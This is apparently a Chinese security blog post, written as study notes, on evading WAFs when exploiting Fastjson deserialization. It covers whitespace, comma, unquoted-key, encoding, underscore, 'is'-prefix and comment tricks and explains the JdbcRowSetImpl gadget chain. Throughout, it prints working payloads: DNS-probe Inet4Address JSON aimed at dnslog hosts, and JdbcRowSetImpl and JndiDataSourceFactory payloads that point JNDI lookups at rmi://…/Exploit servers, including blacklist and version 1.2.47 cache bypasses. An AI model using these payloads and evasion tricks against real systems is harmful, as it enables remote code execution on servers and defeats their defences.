
# Fastjson的Waf绕过

Fastjson算是RCE最常碰到的漏洞了，但是除了利用外对其知之甚少，因此学习一下，这里主要结合Y4tacker师傅的文章进行分析学习。

首先初始exp类似于这样：

[![OfYuUU.jpg](https://s1.ax1x.com/2022/05/16/OfYuUU.jpg)](https://imgtu.com/i/OfYuUU)

## 1.空白字符绕过

在键值对外添加空白字符时会被代码过滤，可用于绕waf

[![OfYnET.jpg](https://s1.ax1x.com/2022/05/16/OfYnET.jpg)](https://imgtu.com/i/OfYnET)

Y4tacker师傅给出了fastjson自身过滤空白字符的代码

 - [ ] com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace
       
       public final void skipWhitespace()
       
       { while(true)
       
       { while(true)
       
       { if (this.ch <= '/')
       
       { if (this.ch == ' ' || this.ch == '\r' || this.ch == '\n' ||
       this.ch == '\t' || this.ch == '\f' || this.ch == '\b')
       
       { this.next(); continue; }
       
       if (this.ch == '/') {
       
       this.skipComment();
       
       continue; } }
       
       return; } } }

## 2.添加逗号

FastJson中有个默认的Feature是开启的 AllowArbitraryCommas ，这允许我们⽤多个逗号

还是师傅分析的

[![OfY6qP.png](https://s1.ax1x.com/2022/05/16/OfY6qP.png)](https://imgtu.com/i/OfY6qP)

添加的位置在键值对两边，在冒号两边添加会出错

[![OfYebV.jpg](https://s1.ax1x.com/2022/05/16/OfYebV.jpg)](https://imgtu.com/i/OfYebV)

## 3.字段名不加引号

默认开启的Feature， AllowUnQuotedFieldNames ，但是只在恢复字段的过程调⽤ 当中有效果

师傅分析的：

[![OfYfPg.png](https://s1.ax1x.com/2022/05/16/OfYfPg.png)](https://imgtu.com/i/OfYfPg)

> {"zeo":{"@type":"java.net.Inet4Address","val":"r.qsu9q8.ceye.io"}}
> 
> ||
> 
> \/
> 
> {"zeo":{"@type":"java.net.Inet4Address",val:"r.qsu9q8.ceye.io"}}

[![OfYZD0.jpg](https://s1.ax1x.com/2022/05/16/OfYZD0.jpg)](https://imgtu.com/i/OfYZD0)

## 4. @type后的值第⼀个引号可以替换为其他字符

[![OfYgVf.png](https://s1.ax1x.com/2022/05/16/OfYgVf.png)](https://imgtu.com/i/OfYgVf)

因此替换引号为任意字符即可正常执行

[![OfYVuq.jpg](https://s1.ax1x.com/2022/05/16/OfYVuq.jpg)](https://imgtu.com/i/OfYVuq)

## 5.编码绕过

⾸先在 com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol ,当中可以看见， 如果遇到了 \u 或者 \x会有解码操作

[![OfYyrt.png](https://s1.ax1x.com/2022/05/16/OfYyrt.png)](https://imgtu.com/i/OfYyrt)

大致是u的情况为读取四个字符排列，以16进制转字符，至于为什么hash*31，是考虑了计算机的计算方法，参考[hashCode 为什么乘以 31?深入理解 hashCode 和 hash 算法_小七会喷火的博客-CSDN博客](https://blog.csdn.net/Javabaibai/article/details/112394217)

v的情况没法控制，不考虑；x的情况则是读取两个字符，计算16进制再转字符

 - [ ] 因此两种情况就是Unicode和ASCII值的转换：
       
       {"zeo":{"@type":"java.net.Inet4Address","val":"r.qsu9q8.ceye.io"}}
       
       {"\u0396eo":{"\x40type":"java.net.Inet4Address","val":"r.qsu9q8.ceye.io"}}

## 6. 对字段添加多个下划线或者减号

1.2.36版本前在 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseFie ld 解析字段的key的时候，调⽤了 smartMatch

[![OfYDxA.png](https://s1.ax1x.com/2022/05/16/OfYDxA.png)](https://imgtu.com/i/OfYDxA)

> {"a": {"@type": "java.lang.Class","val":
> 
> "com.sun.rowset.JdbcRowSetImpl"},"b": {"@type":
> 
> "com.sun.rowset.JdbcRowSetImpl","d_a_taSourceName":
> 
> "rmi://127.0.0.1:1099/Exploit","autoCommit": true}}

1.2.36版本后相反会忽略“-”和"_"，因此利用方法类似

## 7. 属性前添加is

在那个基础上,还是在 smartMatch 当中可以看见，如果前缀有 is ，会去掉 is

[![OfYsKI.png](https://s1.ax1x.com/2022/05/16/OfYsKI.png)](https://imgtu.com/i/OfYsKI)

> {"a": {"@type": "java.lang.Class","val":
> 
> "com.sun.rowset.JdbcRowSetImpl"},"b": {"@type":
> 
> "com.sun.rowset.JdbcRowSetImpl","isdataSourceName":
> 
> "rmi://127.0.0.1:1099/Exploit","isautoCommit": true}}

## 8.注释

Y4tacker师傅给出的一种猜想，实际情况我暂时没有成功

com.alibaba.fastjson.parser.JSONLexerBase#nextToken()

解析时如果开头不为“{”或“[”时，进入nextToken()方法，

[![OfY2a8.png](https://s1.ax1x.com/2022/05/16/OfY2a8.png)](https://imgtu.com/i/OfY2a8)

[![OfYRIS.png](https://s1.ax1x.com/2022/05/16/OfYRIS.png)](https://imgtu.com/i/OfYRIS)

> /*\u001a{/*y4tacker*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSource
> Name":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}*/

其他的注释有：/**/和//，可以插入注释打乱Waf的正则

> {"zeo":{/_adawdawdaw_/"@type":"java.net.Inet4Address","val":"t2t.507a43c8.dns.1433.eu.org."}}

## 9.写在最后的分析

最后再分析几个fastjson的利用链

参考：[fastjson漏洞学习分析](https://www.jianshu.com/p/1ed027080459)

这里没有下载fastjson的包去断点调试，主要依靠文章分析一下

### JdbcRowSetImpl利用链

1.2.24版本：

DefaultJSONParser中，解析json开始，key为@type则加载对应class，autoCommit为true则调用this.connect，connect()方法进而继续建立dataSource去调用lookup()方法，此时请求到恶意的rmi服务通过lookup方法就实例化了这个恶意类

> { "@type":"com.sun.rowset.JdbcRowSetImpl",
> "dataSourceName":"rmi://ip:port/Exploit", "autoCommit":true }

补丁后的绕过：

> {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://ip:port/Exploit"}}
> 使用不在黑名单的类进行绕过{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://ip:port/Exploit","autoCommit":true}使用L和;去匹配头尾规则绕过黑名单

1.2.47版本：

java.lang.Class开始，loadclass->val作为对象进行加载，加载com.sun.rowset.JdbcRowSetImpl类，loadclass函数中，当cache为true是，会将JdbcRowSetImpl类加载到map缓存中，到这第一个类加载结束。第二个类开始，class为空（不存在）时，会从mapping中去找。在第一个json数据处理后，JdbcRowSetImpl类已经被加载到map缓存，然后直接就返回class的类。

> { "a":{ "@type":"java.lang.Class",
> "val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{
> "@type":"com.sun.rowset.JdbcRowSetImpl",
> "dataSourceName":"rmi://ip:9999/Test", "autoCommit":true } }
